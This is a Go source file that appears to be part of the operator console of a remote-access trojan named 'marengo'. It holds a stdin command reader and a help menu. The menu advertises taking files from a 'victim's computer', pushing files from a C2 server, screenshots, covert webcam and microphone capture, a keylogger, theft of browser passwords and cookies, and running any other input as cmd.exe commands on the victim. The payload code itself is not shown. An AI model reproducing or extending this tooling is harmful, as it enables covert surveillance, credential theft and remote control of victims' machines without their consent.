package work

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
)

const (
	ColorReset  = "\033[0m"
	ColorCyan   = "\033[36m"
	ColorYellow = "\033[33m"
	ColorGreen  = "\033[32m"
)

func getInputString() (string, error) {
	reader := bufio.NewReader(os.Stdin)
	command, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(command), nil
}

func help() {
	fmt.Printf("%s%-50s%s%-60s%s\n", ColorCyan, "command", ColorCyan, "Description", ColorReset)
	fmt.Printf("%s%-50s%s%-60s%s\n", ColorCyan, strings.Repeat("=", 50), ColorCyan, strings.Repeat("=", 60), ColorReset)

	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "marengo -help", ColorReset, "prints this message", ColorReset)
	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "get file <path\\to\\file>", ColorReset, "retrieves a file from the specified path in victim's computer", ColorReset)
	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "send file <path\\to\\file>", ColorReset, "sends a file from C2 server to a victim", ColorReset)
	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "screenshot", ColorReset, "captures a screenshot", ColorReset)
	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "cameracapture", ColorReset, "captures an image using the camera", ColorReset)
	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "microphone recording <time in seconds>", ColorReset, "records audio from the microphone", ColorReset)
	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "keylogger start <time in seconds>", ColorReset, "records keystrokes for a specified time", ColorReset)
	log.Printf("%s%-50s%s%-60s%s", ColorYellow, "browser extract <URL (optional)>", ColorReset, "extracts passwords and cookies database from known browsers", ColorReset)

	fmt.Println()
	log.Println(string(ColorGreen) + "Tip: Any additional strings you input will be automatically interpreted as commands for the cmd.exe shell by default." + string(ColorReset))
	fmt.Println()
}
